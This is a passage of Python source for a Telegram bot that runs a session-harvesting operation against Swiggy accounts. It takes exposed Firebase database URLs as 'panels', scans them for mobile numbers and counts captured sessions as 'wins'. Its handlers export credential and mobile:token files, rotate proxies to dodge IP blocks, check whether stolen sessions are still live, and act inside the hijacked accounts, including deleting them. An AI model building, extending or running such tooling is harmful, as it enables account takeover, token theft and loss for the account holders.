    keyboard.add(ib(f"📊 Status: {status}", "noop"))
    keyboard.add(ib("▶️ Start Scan", "start_scan"),
                 ib("⏹ Stop",        "stop_scan"))
    keyboard.add(ib(f"👷 Workers: {workers}", "noop"),
                 ib("⚙️ Set Workers",          "set_workers"))
    keyboard.add(ib(f"➕ Add Panel", "add_panel"),
                 ib(f"📋 Panels ({panel_count})", "view_panels"))
    keyboard.add(ib(f"🗑 Clear Used ({used_count})", "clear_used"),
                 ib(f"📄 Sessions ({sess_count})", "view_sessions"))
    keyboard.add(ib("📥 Export ZIP",    "export_zip"),
                 ib("🗑 Clear Sessions", "clear_all_sessions"))
    keyboard.add(ib("🔍 Check Live",   "check_live_sessions"),
                 ib("🔁 Re-run All",   "rerun_used_panels"))
    failed_label = f"⚠️ Rerun Failed ({failed_count})" if failed_count else "⚠️ Rerun Failed"
    keyboard.add(ib(failed_label, "rerun_failed_panels"))
    if disabled_count:
        keyboard.add(ib(f"🧹 Clean Dead ({disabled_count})", "clean_dead_panels"))
    keyboard.add(ib(f"🌐 Proxy: {px_label} (pool={px_count})", "proxy_info"))
    keyboard.add(ib("🔄 Reload Proxies", "reload_proxies"),
                 ib("🔁 Rotate Proxy",   "rotate_proxy_now"))
    keyboard.add(ib("🧪 Test Proxies",  "test_proxies"))
    return keyboard


@bot.message_handler(commands=["start", "menu"])
def start_command(message: types.Message) -> None:
    user_id = message.from_user.id
    user_sessions[user_id] = {
        "step":       "idle",
        "phone":      None,
        "tid":        None,
        "sid":        None,
        "token":      None,
        "fp":         None,
        "headers":    None,
    }
    pop_state(user_id)
    # Send reply keyboard first (persistent typing-bar buttons)
    bot.send_message(
        message.chat.id,
        "⌨️ Keyboard set!",
        reply_markup=_reply_keyboard(),
    )
    # Open the tabbed control panel
    _send_panel(message.chat.id)


@bot.message_handler(commands=["panel", "dashboard"])
def panel_command(message: types.Message) -> None:
    user_id = message.from_user.id
    user_sessions[user_id] = {"step": "idle"}
    pop_state(user_id)
    _send_panel(message.chat.id)


# ═══════════════════════════════════════════════════════════════════════════════
# ZIP IMPORT — handle document uploads
# ═══════════════════════════════════════════════════════════════════════════════

@bot.message_handler(content_types=["document"])
def handle_document(message: types.Message) -> None:
    user_id = message.from_user.id
    chat_id = message.chat.id
    doc = message.document
    if not doc:
        return

    st = get_state(user_id)
    # Only process if user is in import_zip state OR file is a zip
    fname = (doc.file_name or "").lower()
    if not fname.endswith(".zip"):
        if st.get("step") == "import_zip":
            pop_state(user_id)
            bot.send_message(chat_id, "❌ Only <code>.zip</code> files supported for session import.",
                             parse_mode="HTML")
        return

    pop_state(user_id)
    wait_msg = bot.send_message(chat_id, "📤 <b>Importing sessions…</b>", parse_mode="HTML")

    def _do_import():
        try:
            file_info = bot.get_file(doc.file_id)
            raw = bot.download_file(file_info.file_path)
        except Exception as e:
            bot.edit_message_text(f"❌ Download failed: <code>{_panel_esc(e)}</code>",
                                  chat_id, wait_msg.message_id, parse_mode="HTML")
            return

        imported = 0
        dupes    = 0
        errors   = 0

        try:
            with zipfile.ZipFile(io.BytesIO(raw)) as zf:
                json_names = [n for n in zf.namelist()
                              if n.endswith(".json") and not n.startswith("__MACOSX")]
                for jname in json_names:
                    try:
                        data = json.loads(zf.read(jname).decode("utf-8", errors="replace"))
                    except Exception:
                        errors += 1
                        continue
                    # Could be a list of sessions or a single session dict
                    if isinstance(data, dict):
                        candidates = [data]
                    elif isinstance(data, list):
                        candidates = [d for d in data if isinstance(d, dict)]
                    else:
                        continue
                    for rec in candidates:
                        mob = str(rec.get("mobile", "")).strip()
                        if not mob or not (8 <= len(mob) <= 12):
                            continue
                        if already_saved(mob):
                            dupes += 1
                            continue
                        # Ensure required fields
                        rec.setdefault("sessionId", uuid.uuid4().hex)
                        rec.setdefault("completedAt", now_iso())
                        rec.setdefault("accountType", "IMPORTED")
                        try:
                            save_session_record(rec)
                            imported += 1
                        except Exception:
                            errors += 1
        except zipfile.BadZipFile:
            bot.edit_message_text("❌ Invalid ZIP file.", chat_id, wait_msg.message_id)
            return
        except Exception as e:
            bot.edit_message_text(f"❌ Import error: <code>{_panel_esc(e)}</code>",
                                  chat_id, wait_msg.message_id, parse_mode="HTML")
            return

        bot.edit_message_text(
            f"📤 <b>Import complete!</b>\n\n"
            f"✅ Imported: <b>{imported}</b>\n"
            f"⏭ Duplicates skipped: <b>{dupes}</b>\n"
            f"❌ Errors: <b>{errors}</b>",
            chat_id, wait_msg.message_id,
            parse_mode="HTML",
            reply_markup=_main_keyboard(),
        )

    threading.Thread(target=_do_import, daemon=True).start()


@bot.message_handler(func=lambda m: True)
def handle_message(message: types.Message) -> None:
    user_id = message.from_user.id
    chat_id = message.chat.id
    text    = (message.text or "").strip()

    st        = get_state(user_id)
    step_state = st.get("step")

    # ── Control Panel button opens from any state ────────────────────────────
    if text in ("🎛 Control Panel", "🎛 Panel"):
        pop_state(user_id)
        _send_panel(chat_id)
        return

    # ── Per-account text prompts ─────────────────────────────────────────────
    if step_state == "acct_search":
        idx = st.get("idx", -1)
        acc = _acct_account(idx)
        pop_state(user_id)
        if not acc:
            bot.send_message(chat_id, "⚠️ Account gone. Reopen the Accounts tab.",
                             reply_markup=_main_keyboard())
            return
        if not text:
            bot.send_message(chat_id, "Send a product name to search.")
            return
        note = bot.send_message(chat_id, f"🔎 searching <b>{_panel_esc(text)}</b>…",
                                parse_mode="HTML")

        def _search_work():
            aid = _acct_state(chat_id).get("address_id")
            if not aid:
                addrs = _acct_addresses(acc.addresses("im"))
                if addrs:
                    _acct_set(chat_id, addresses=addrs, address_id=addrs[0]["id"],
                              address_label=addrs[0]["label"])
                    aid = addrs[0]["id"]
            if not aid:
                return "❌ No delivery address available for this account.", None
            res = acc.search_products(text, aid)
            prods = _acct_products(res)
            _acct_set(chat_id, search=prods)
            kb = types.InlineKeyboardMarkup(row_width=1)
            for n, p in enumerate(prods[:12]):
                kb.row(ib(f"➕ {p['name']}", f"acct:add:{idx}:{n}"))
            kb.row(ib("🛒 Cart", f"acct:cart:{idx}:im"), ib("⬅️ Back", f"acct:view:{idx}"))
            if not prods:
                return f"🔎 <b>{_panel_esc(text)}</b>\n<i>no products</i>", kb
            lines = [f"🔎 <b>{_panel_esc(text)}</b> · {len(prods)} variants", ""]
            for p in prods[:12]:
                lines.append(f"• {_panel_esc(p['name'])}")
            return "\n".join(lines), kb

        def _search_run():
            try:
                t, kb = _search_work()
            except Exception as e:
                t, kb = f"❌ <code>{_panel_esc(e)}</code>", None
            _acct_edit(chat_id, note.message_id, t, kb)

        threading.Thread(target=_search_run, daemon=True).start()
        return

    if step_state == "acct_food":
        idx = st.get("idx", -1)
        acc = _acct_account(idx)
        pop_state(user_id)
        if not acc:
            bot.send_message(chat_id, "⚠️ Account gone.", reply_markup=_main_keyboard())
            return
        parts2 = text.replace(",", " ").split()
        if len(parts2) < 3:
            bot.send_message(chat_id, "Format: <code>restaurantId lat lng</code>",
                             parse_mode="HTML")
            return
        rid, lat, lng = parts2[0], parts2[1], parts2[2]
        note = bot.send_message(chat_id, "🍔 loading menu…", parse_mode="HTML")

        def _food_work():
            try:
                res = acc.food_menu(rid, float(lat), float(lng))
            except ValueError:
                return "❌ lat/lng must be numbers.", None
            body = json.dumps(res.get("data"), ensure_ascii=False)[:2500]
            kb = types.InlineKeyboardMarkup(row_width=2)
            kb.row(ib("🎟 Coupons", f"acct:coupons:{idx}:{rid}"), ib("⬅️ Back", f"acct:view:{idx}"))
            head = f"🍔 <b>Menu</b> · <code>{_panel_esc(rid)}</code>\n"
            if not res.get("ok"):
                head += f"❌ {_panel_esc(account_ops.summarize(res))}\n"
            return head + f"<pre>{_panel_esc(body)}</pre>", kb

        def _food_run():
            try:
                t, kb = _food_work()
            except Exception as e:
                t, kb = f"❌ <code>{_panel_esc(e)}</code>", None
            _acct_edit(chat_id, note.message_id, t, kb)

        threading.Thread(target=_food_run, daemon=True).start()
        return

    if step_state == "acct_delete_otp":
        idx = st.get("idx", -1)
        acc = _acct_account(idx)
        pop_state(user_id)
        if not acc:
            bot.send_message(chat_id, "⚠️ Account gone.", reply_markup=_main_keyboard())
            return
        otp = re.sub(r"\D", "", text)
        if not (4 <= len(otp) <= 8):
            bot.send_message(chat_id, "❌ Send the numeric OTP (4–8 digits).")
            return
        note = bot.send_message(chat_id, "🗑 deleting account…", parse_mode="HTML")

        def _del_work():
            res = acc.delete_account(otp)
            ok = (res.get("web") or {}).get("ok") or (res.get("native") or {}).get("ok")
            if ok:
                _persist_session_update(acc.mobile, {"sessionStatus": "DELETED",
                                                     "sessionStatusCheckedAt": now_iso()})
            body = json.dumps(res, ensure_ascii=False)[:1800]
            return (f"🗑 <b>{'Delete accepted' if ok else 'Delete failed'}</b> · "
                    f"<code>+91{_panel_esc(acc.mobile)}</code>\n"
                    f"<pre>{_panel_esc(body)}</pre>", _acct_kb(chat_id, idx))

        def _del_run():
            try:
                t, kb = _del_work()
            except Exception as e:
                t, kb = f"❌ <code>{_panel_esc(e)}</code>", None
            _acct_edit(chat_id, note.message_id, t, kb)

        threading.Thread(target=_del_run, daemon=True).start()
        return

    # ── Reply keyboard quick-actions (typing bar buttons) ────────────────────
    if not step_state or step_state == "idle":
        _quick = {
            "▶️ Start Scan":    "start_scan",
            "⏹ Stop":           "stop_scan",
            "📊 Status":        "show_status",
            "📋 Panels":        "view_panels",
            "📄 Sessions":      "view_sessions",
            "📥 Export ZIP":     "export_zip",
            "➕ Add Panel":      "add_panel",
            "🗑 Clear Used":     "clear_used",
            "🔁 Re-run All":    "rerun_used_panels",
            "🧪 Proxies":       "test_proxies",
            "⚠️ Rerun Failed":  "rerun_failed_panels",
        }
        if text in _quick:
            # Fake a callback query by calling the handler logic directly
            _handle_quick_action(chat_id, user_id, _quick[text])
            return

    if step_state == "set_workers":
        if text.isdigit() and 1 <= int(text) <= 30:
            STORE["workers"] = int(text)
            save_store()
            bot.send_message(chat_id, f"✅ Workers set to {text}", reply_markup=_main_keyboard())
        else:
            bot.send_message(chat_id, "❌ 1–30 ke beech number bhejo.")
        pop_state(user_id)
        return

    if step_state == "import_zip":
        # User sent text instead of file
        bot.send_message(chat_id,
            "📤 Please send a <code>.zip</code> file, not text.\n"
            "Or press /start to cancel.",
            parse_mode="HTML")
        return

    if step_state == "add_panel":
        result = _parse_firebase_urls(text)
        added    = result["added"]
        dupes    = result["duplicate"]
        invalid  = result["invalid"]

        lines = []
        if added:
            lines.append(f"✅ <b>{len(added)} new panel(s) added:</b>")
            for u in added[:20]:
                host = (urlparse(u).hostname or u)[:50]
                lines.append(f"  • <code>{host}</code>")
            if len(added) > 20:
                lines.append(f"  … and {len(added)-20} more")
        if dupes:
            lines.append(f"\n⚠️ <b>{len(dupes)} already exist (skipped):</b>")
            for u in dupes[:10]:
                host = (urlparse(u).hostname or u)[:50]
                lines.append(f"  • <code>{host}</code>")
            if len(dupes) > 10:
                lines.append(f"  … and {len(dupes)-10} more")
        if invalid:
            lines.append(f"\n❌ {invalid} line(s) not recognised as Firebase URLs")
        if not added and not dupes:
            lines.append("❌ No valid Firebase URLs found.\nFormat: https://xxx.firebaseio.com/")

        if added:
            save_store()
            # Store newly added panels per user so we can run just those
            _NEWLY_ADDED_PANELS[user_id] = added
            # Build keyboard asking whether to run them
            kb = types.InlineKeyboardMarkup(row_width=1)
            kb.add(ib(f"▶️ Run newly added {len(added)} panel(s) now", "run_newly_added"))
            kb.add(ib("🏠 Back to menu", "back_to_menu"))
            bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML", reply_markup=kb)
        else:
            bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML", reply_markup=_main_keyboard())

        pop_state(user_id)
        return

    bot.send_message(chat_id, "👉 /start karke menu kholo.", reply_markup=_main_keyboard())


def _handle_quick_action(chat_id: int, user_id: int, action: str) -> None:
    """Handle reply-keyboard quick actions by simulating callback logic."""
    global AUTO_RUNNING, LIVE_MSG_ID, _proxy_pool

    if action == "show_status":
        sess_count = len(_load_json_list(SESSIONS_FULL))
        panel_count = len(STORE.get("panels", []))
        with USED_NUMBERS_LOCK:
            used_count = len(USED_NUMBERS)
        with FAILED_PANELS_LOCK:
            failed_count = len(FAILED_PANELS)
        status = "🟢 RUNNING" if AUTO_RUNNING else "🔴 STOPPED"
        bot.send_message(
            chat_id,
            f"📊 <b>Status: {status}</b>\n\n"
            f"📋 Panels: <b>{panel_count}</b>\n"
            f"💾 Sessions: <b>{sess_count}</b>\n"
            f"🗑 Used numbers: <b>{used_count}</b>\n"
            f"⚠️ Failed panels: <b>{failed_count}</b>\n"
            f"✅ Wins: <b>{STATS['wins']}</b>  ❌ Fails: <b>{STATS['fails']}</b>\n"
            f"⏭ Skipped: <b>{STATS['skipped']}</b>  📊 Processed: <b>{STATS['processed']}</b>",
            parse_mode="HTML",
            reply_markup=_main_keyboard(),
        )
        return

    if action == "start_scan":
        if AUTO_RUNNING:
            bot.send_message(chat_id, "⚠️ Already running!", reply_markup=_main_keyboard())
            return
        if not STORE.get("panels"):
            bot.send_message(chat_id, "❌ Add a panel first.", reply_markup=_main_keyboard())
            return
        AUTO_RUNNING = True
        LIVE_MSG_ID  = None
        STATS.update({"processed": 0, "wins": 0, "fails": 0, "skipped": 0})
        with LIVE_LOCK:
            LIVE_QUEUE.clear()
        bot.send_message(chat_id, "🚀 Scan started!", reply_markup=_main_keyboard())
        threading.Thread(target=run_worker, daemon=True).start()
        threading.Thread(target=live_status_updater, args=(chat_id,), daemon=True).start()
        return

    if action == "stop_scan":
        AUTO_RUNNING = False
        bot.send_message(chat_id, "⏹ Stopping…", reply_markup=_main_keyboard())
        return

    if action == "add_panel":
        bot.send_message(
            chat_id,
            "📥 <b>Add Firebase Panels</b>\n\n"
            "Paste URLs in <b>any format</b> — one per line, comma-separated, raw dump:\n\n"
            "<code>https://xxx-default-rtdb.firebaseio.com/</code>\n\n"
            "✅ Duplicates auto-skipped",
            parse_mode="HTML",
        )
        set_state(user_id, step="add_panel")
        return

    if action == "clear_used":
        with USED_NUMBERS_LOCK:
            count = len(USED_NUMBERS)
            USED_NUMBERS.clear()
        save_store()
        bot.send_message(chat_id, f"🗑 Cleared {count} used numbers!", reply_markup=_main_keyboard())
        return

    if action == "view_panels":
        panels = STORE.get("panels", [])
        if not panels:
            bot.send_message(chat_id, "📋 No panels yet.", reply_markup=_main_keyboard())
            return
        txt = f"📋 <b>Panels ({len(panels)}):</b>\n\n"
        for p in panels[:30]:
            host = (urlparse(p).hostname or p)[:40]
            txt += f"• {host}\n"
        if len(panels) > 30:
            txt += f"\n… and {len(panels)-30} more"
        bot.send_message(chat_id, txt, parse_mode="HTML", reply_markup=_main_keyboard())
        return

    if action == "view_sessions":
        recs = _load_json_list(SESSIONS_MINIMAL)
        if not recs:
            bot.send_message(chat_id, "📂 No sessions yet.", reply_markup=_main_keyboard())
            return
        lines = [f"📦 <b>{len(recs)} sessions saved:</b>\n"]
        for i, r in enumerate(recs[-20:], 1):
            mob = r.get("mobile", "?")
            cid = r.get("customerId", "-")
            lines.append(f"{len(recs)-20+i}. +91{mob}  cid={cid}")
        if len(recs) > 20:
            lines.insert(1, f"(showing last 20 of {len(recs)})\n")
        bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML", reply_markup=_main_keyboard())
        return

    if action == "export_zip":
        recs = _load_json_list(SESSIONS_FULL)
        if not recs:
            bot.send_message(chat_id, "📂 No sessions to export.", reply_markup=_main_keyboard())
            return
        wait_msg = bot.send_message(chat_id, f"⏳ Packing <b>{len(recs)}</b> sessions…", parse_mode="HTML")
        try:
            zip_bytes = generate_sessions_zip()
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = f"swiggy_sessions_{ts}.zip"
            tmp = tempfile.NamedTemporaryFile(suffix=".zip", delete=False)
            tmp.write(zip_bytes)
            tmp.close()
            with open(tmp.name, "rb") as doc_file:
                bot.send_document(
                    chat_id, doc_file,
                    visible_file_name=fname,
                    caption=f"📦 <b>{len(recs)}</b> sessions exported",
                    parse_mode="HTML",
                )
            os.unlink(tmp.name)
            try:
                bot.delete_message(chat_id, wait_msg.message_id)
            except Exception:
                pass
        except Exception as e:
            bot.send_message(chat_id, f"❌ Export failed: <code>{e}</code>", parse_mode="HTML",
                             reply_markup=_main_keyboard())
        return

    if action == "rerun_used_panels":
        with USED_NUMBERS_LOCK:
            count = len(USED_NUMBERS)
            USED_NUMBERS.clear()
        save_store()
        bot.send_message(
            chat_id,
            f"🔁 <b>Cleared {count} used numbers!</b>\nPress ▶️ Start Scan to re-run.",
            parse_mode="HTML",
            reply_markup=_main_keyboard(),
        )
        return

    if action == "test_proxies":
        if not _proxy_pool:
            bot.send_message(chat_id, "❌ No proxies loaded.", reply_markup=_main_keyboard())
            return
        lines = ["🧪 <b>Proxy Health Check</b>\n"]
        for px in _proxy_pool:
            label = px.split("@")[-1] if "@" in px else px
            ok, result = test_proxy(px, timeout=10)
            if ok:
                lines.append(f"✅ <code>{label}</code> → IP: <code>{result}</code>")
            else:
                lines.append(f"❌ <code>{label}</code> → {result}")
        bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML", reply_markup=_main_keyboard())
        return

    if action == "rerun_failed_panels":
        with FAILED_PANELS_LOCK:
            failed = list(FAILED_PANELS)
            FAILED_PANELS.clear()
        if not failed:
            bot.send_message(chat_id, "✅ No failed panels.", reply_markup=_main_keyboard())
            return
        if AUTO_RUNNING:
            bot.send_message(chat_id, "⚠️ Already running! Stop first.", reply_markup=_main_keyboard())
            return
        with USED_NUMBERS_LOCK:
            count = len(USED_NUMBERS)
            USED_NUMBERS.clear()
        save_store()
        _NEWLY_ADDED_PANELS[user_id] = failed
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(ib(f"▶️ Run {len(failed)} failed panel(s) now", "run_newly_added"))
        kb.add(ib("🏠 Back to menu", "back_to_menu"))
        bot.send_message(
            chat_id,
            f"⚠️ <b>{len(failed)}</b> failed panel(s). Cleared {count} used numbers.\n"
            f"Press the button below to re-run them.",
            parse_mode="HTML",
            reply_markup=kb,
        )
        return

    # Fallback
    bot.send_message(chat_id, "👉 Use /start or the menu.", reply_markup=_main_keyboard())


@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call: types.CallbackQuery) -> None:
    global AUTO_RUNNING, LIVE_MSG_ID, _proxy_pool

    user_id = call.from_user.id
    chat_id = call.message.chat.id
    data    = call.data

    # ── Control-panel callbacks (tabbed dashboard) ────────────────────────────
    if data and data.startswith("pnl:"):
        _handle_panel_callback(call)
        return

    # ── Per-account operations callbacks ──────────────────────────────────────
    if data and data.startswith("acct:"):
        _handle_acct_callback(call)
        return

    if data == "noop":
        bot.answer_callback_query(call.id)
        return

    # ── START SCAN ────────────────────────────────────────────────────────────
    if data == "start_scan":
        if AUTO_RUNNING:
            bot.answer_callback_query(call.id, "⚠️ Already running!")
            return
        if not STORE.get("panels"):
            bot.answer_callback_query(call.id, "❌ Add a panel first.")
            return
        AUTO_RUNNING = True
        LIVE_MSG_ID  = None
        STATS.update({"processed": 0, "wins": 0, "fails": 0, "skipped": 0})
        with LIVE_LOCK:
            LIVE_QUEUE.clear()
        bot.answer_callback_query(call.id, "🚀 Scan started!")
        threading.Thread(target=run_worker,          daemon=True).start()
        threading.Thread(target=live_status_updater, args=(chat_id,), daemon=True).start()
        return

    # ── STOP SCAN ─────────────────────────────────────────────────────────────
    if data == "stop_scan":
        AUTO_RUNNING = False
        bot.answer_callback_query(call.id, "⏹ Stopping…")
        return

    # ── SET WORKERS ───────────────────────────────────────────────────────────
    if data == "set_workers":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "Workers ki number bhejo (1–30):")
        set_state(user_id, step="set_workers")
        return

    # ── ADD PANEL ─────────────────────────────────────────────────────────────
    if data == "add_panel":
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "📥 <b>Add Firebase Panels</b>\n\n"
            "Paste URLs in <b>any format</b> — one per line, comma-separated, raw dump, whatever:\n\n"
            "<code>https://rto43-32636-default-rtdb.firebaseio.com/\n"
            "https://rtx-c9-default-rtdb.asia-southeast1.firebasedatabase.app/\n"
            "ruhfyg-78198-default-rtdb.firebaseio.com</code>\n\n"
            "✅ Already-existing ones are auto-skipped\n"
            "🔍 Duplicates detected and reported",
            parse_mode="HTML",
        )
        set_state(user_id, step="add_panel")
        return

    # ── VIEW PANELS ───────────────────────────────────────────────────────────
    if data == "view_panels":
        bot.answer_callback_query(call.id)
        panels = STORE.get("panels", [])
        if not panels:
            bot.send_message(chat_id, "📋 No panels yet.", reply_markup=_main_keyboard())
            return
        txt = f"📋 <b>Panels ({len(panels)}):</b>\n\n"
        for p in panels[:30]:
            host = (urlparse(p).hostname or p)[:40]
            txt += f"• {host}\n"
        if len(panels) > 30:
            txt += f"\n… and {len(panels)-30} more"
        bot.send_message(chat_id, txt, parse_mode="HTML", reply_markup=_main_keyboard())
        return

    # ── CLEAR USED ────────────────────────────────────────────────────────────
    if data == "clear_used":
        with USED_NUMBERS_LOCK:
            count = len(USED_NUMBERS)
            USED_NUMBERS.clear()
        save_store()
        bot.answer_callback_query(call.id, f"🗑 Cleared {count} used numbers!")
        bot.send_message(chat_id, f"🗑 Cleared <b>{count}</b> used numbers!", parse_mode="HTML",
                         reply_markup=_main_keyboard())
        return

    # ── VIEW SESSIONS ─────────────────────────────────────────────────────────
    if data == "view_sessions":
        bot.answer_callback_query(call.id)
        recs = _load_json_list(SESSIONS_MINIMAL)
        if not recs:
            bot.send_message(chat_id, "📂 No sessions harvested yet.", reply_markup=_main_keyboard())
            return
        lines = [f"📦 <b>{len(recs)} sessions saved:</b>\n"]
        for i, r in enumerate(recs[-20:], 1):
            mob   = r.get("mobile", "?")
            cid   = r.get("customerId", "-")
            lines.append(f"{len(recs)-20+i}. +91{mob}  cid={cid}")
        if len(recs) > 20:
            lines.insert(1, f"(showing last 20 of {len(recs)})\n")
        lines.append(f"\n💾 Full data in <code>sessions.json</code>")
        bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML", reply_markup=_main_keyboard())
        return

    # ── EXPORT ZIP ────────────────────────────────────────────────────────────
    if data == "export_zip":
        bot.answer_callback_query(call.id, "📦 Generating ZIP…")
        recs = _load_json_list(SESSIONS_FULL)
        if not recs:
            bot.send_message(chat_id, "📂 No sessions to export yet.", reply_markup=_main_keyboard())
            return
        wait_msg = bot.send_message(chat_id, f"⏳ Packing <b>{len(recs)}</b> sessions into ZIP…", parse_mode="HTML")
        try:
            zip_bytes = generate_sessions_zip()
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = f"swiggy_sessions_{ts}.zip"
            # Write to temp file and send — most reliable method
            tmp = tempfile.NamedTemporaryFile(suffix=".zip", delete=False)
            tmp.write(zip_bytes)
            tmp.close()
            with open(tmp.name, "rb") as doc_file:
                bot.send_document(
                    chat_id, doc_file,
                    visible_file_name=fname,
                    caption=(
                        f"📦 <b>Sessions Export</b>\n"
                        f"✅ <b>{len(recs)}</b> sessions packed\n\n"
                        f"🗂 <code>sessions.json</code> — full records\n"
                        f"🗂 <code>sessions_minimal.json</code> — credentials only\n"
                        f"🗂 <code>tokens.txt</code> — mobile:token list\n"
                        f"🗂 <code>sessions_summary.csv</code> — spreadsheet\n"
                        f"🗂 Individual <code>&lt;mobile&gt;.json</code> files"
                    ),
                    parse_mode="HTML",
                )
            os.unlink(tmp.name)
            try:
                bot.delete_message(chat_id, wait_msg.message_id)
            except Exception:
                pass
        except Exception as e:
            bot.send_message(chat_id, f"❌ Export failed: <code>{e}</code>", parse_mode="HTML",
                             reply_markup=_main_keyboard())
        return

    # ── CLEAR ALL SESSIONS — confirmation gate ────────────────────────────────
    if data == "clear_all_sessions":
        bot.answer_callback_query(call.id)
        recs = _load_json_list(SESSIONS_FULL)
        count = len(recs)
        if count == 0:
            bot.send_message(chat_id, "📂 Nothing to clear — sessions already empty.",
                             reply_markup=_main_keyboard())
            return
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(
            ib(f"🗑 YES — Delete all {count} sessions", "confirm_clear_sessions"),
            ib("❌ Cancel",                              "back_to_menu"),
        )
        bot.send_message(
            chat_id,
            f"⚠️ <b>Are you sure?</b>\n\n"
            f"This will permanently delete <b>{count}</b> harvested sessions:\n"
            f"• sessions.json\n"
            f"• sessions_minimal.json\n"
            f"• All individual session files\n"
            f"• Used numbers list\n\n"
            f"<b>This cannot be undone!</b> Export ZIP first if you want a backup.",
            parse_mode="HTML",
            reply_markup=kb,
        )
        return

    # ── CONFIRM CLEAR SESSIONS (after user said yes) ───────────────────────────
    if data == "confirm_clear_sessions":
        bot.answer_callback_query(call.id, "🗑 Clearing…")
        with _sessions_lock:
            old_count = len(_load_json_list(SESSIONS_FULL))
            _atomic_save(SESSIONS_FULL, [])
            _atomic_save(SESSIONS_MINIMAL, [])
        try:
            if INDIVIDUAL_DIR.exists():
                for _fp in INDIVIDUAL_DIR.glob("*.json"):
                    _fp.unlink()
        except Exception:
            pass
        with USED_NUMBERS_LOCK:
            USED_NUMBERS.clear()
        save_store()
        bot.send_message(
            chat_id,
            f"🗑 <b>Done — {old_count} sessions cleared!</b>\n\n"
            f"• sessions.json → empty\n"
            f"• sessions_minimal.json → empty\n"
            f"• individual_sessions/ → cleared\n"
            f"• Used numbers → cleared\n\n"
            f"Fresh start! 🚀",
            parse_mode="HTML",
            reply_markup=_main_keyboard(),
        )
        return

    # ── PROXY INFO ────────────────────────────────────────────────────────────
    if data == "proxy_info":
        bot.answer_callback_query(call.id)
        px = current_proxy()
        if not px:
            bot.send_message(chat_id,
                "🌐 <b>Proxy status:</b> Direct (no proxies loaded)\n"
                "Add proxies to <code>proxies.txt</code> and reload.",
                parse_mode="HTML", reply_markup=_main_keyboard())
            return
        label = px.split("@")[-1] if "@" in px else px
        txt = (
            f"🌐 <b>Proxy Pool:</b>\n"
            f"• Total proxies: {len(_proxy_pool)}\n"
            f"• Current: <code>{label}</code>\n"
            f"• Total 403s: {_total_403}\n"
            f"• Consec 403s: {_consec_403}\n"
            f"• IP blocked: {'YES ⛔' if _ip_blocked else 'No ✅'}"
        )
        bot.send_message(chat_id, txt, parse_mode="HTML", reply_markup=_main_keyboard())
        return

    # ── RELOAD PROXIES ────────────────────────────────────────────────────────
    if data == "reload_proxies":
        _proxy_pool.clear()
        new_proxies = load_proxies()
        _proxy_pool.extend(new_proxies)
        bot.answer_callback_query(call.id, f"✅ Loaded {len(new_proxies)} proxies!")
        bot.send_message(
            chat_id,
            f"🔀 <b>Proxies reloaded:</b> {len(new_proxies)} proxies in pool",
            parse_mode="HTML",
            reply_markup=_main_keyboard(),
        )
        return

    # ── ROTATE PROXY ──────────────────────────────────────────────────────────
    if data == "rotate_proxy_now":
        new = rotate_proxy()
        if new:
            label = new.split("@")[-1] if "@" in new else new
            bot.answer_callback_query(call.id, f"🔄 Rotated → {label}")
        else:
            bot.answer_callback_query(call.id, "❌ No proxies in pool")
        return

    # ── TEST PROXIES ──────────────────────────────────────────────────────────
    if data == "test_proxies":
        bot.answer_callback_query(call.id, "🧪 Testing proxies…")
        if not _proxy_pool:
            bot.send_message(chat_id, "❌ No proxies loaded. Add proxies to <code>proxies.txt</code> and reload.",
                             parse_mode="HTML", reply_markup=_main_keyboard())
            return
        lines = ["🧪 <b>Proxy Health Check</b>\n"]
        for px in _proxy_pool:
            label = px.split("@")[-1] if "@" in px else px
            ok, result = test_proxy(px, timeout=10)
            if ok:
                lines.append(f"✅ <code>{label}</code> → IP: <code>{result}</code>")
            else:
                lines.append(f"❌ <code>{label}</code> → {result}")
        bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML", reply_markup=_main_keyboard())
        return

    # ── CHECK LIVE SESSIONS ───────────────────────────────────────────────────
    if data == "check_live_sessions":
        bot.answer_callback_query(call.id, "🔍 Checking sessions…")
        all_sess = _load_json_list(SESSIONS_FULL)
        if not all_sess:
            bot.send_message(chat_id, "📂 No sessions to check.", reply_markup=_main_keyboard())
            return
        bot.send_message(chat_id, f"🔍 Checking <b>{len(all_sess)}</b> sessions with Swiggy API… (may take 30-60s)",
                         parse_mode="HTML")
        log_lines = []
        def _tg_log(msg):
            log_lines.append(msg)

        results = check_all_sessions_live(all_sess, log_func=_tg_log)

        live    = [m for m, s in results.items() if s == "LIVE"]
        expired = [m for m, s in results.items() if s == "EXPIRED"]
        errors  = [m for m, s in results.items() if s == "ERROR"]

        summary = [
            f"📊 <b>Session Status Report</b>",
            f"🟢 Live: <b>{len(live)}</b>  🔴 Expired: <b>{len(expired)}</b>  ⚠️ Error: <b>{len(errors)}</b>\n",
        ]
        if live:
            summary.append("🟢 <b>Live sessions:</b>")
            summary.extend([f"  • +91{m}" for m in live[:30]])
            if len(live) > 30:
                summary.append(f"  … and {len(live)-30} more")
        if expired:
            summary.append("\n🔴 <b>Expired:</b>")
            summary.extend([f"  • +91{m}" for m in expired[:15]])
        if errors:
            summary.append(f"\n⚠️ {len(errors)} sessions could not be checked (network)")

        # Update sessionStatus in SESSIONS_FULL
        with _sessions_lock:
            fl = _load_json_list(SESSIONS_FULL)
            now = now_iso()
            for s in fl:
                mob = str(s.get("mobile", "")).strip()
                if mob in results:
                    s["sessionStatus"] = results[mob]
                    s["sessionStatusCheckedAt"] = now
            _atomic_save(SESSIONS_FULL, fl)

        bot.send_message(chat_id, "\n".join(summary), parse_mode="HTML", reply_markup=_main_keyboard())
        return

    # ── RE-RUN USED PANELS ────────────────────────────────────────────────────
    if data == "rerun_used_panels":
        bot.answer_callback_query(call.id)
        with USED_NUMBERS_LOCK:
            count = len(USED_NUMBERS)
            USED_NUMBERS.clear()
        save_store()
        bot.send_message(
            chat_id,
            f"🔁 <b>Cleared {count} used numbers!</b>\n"
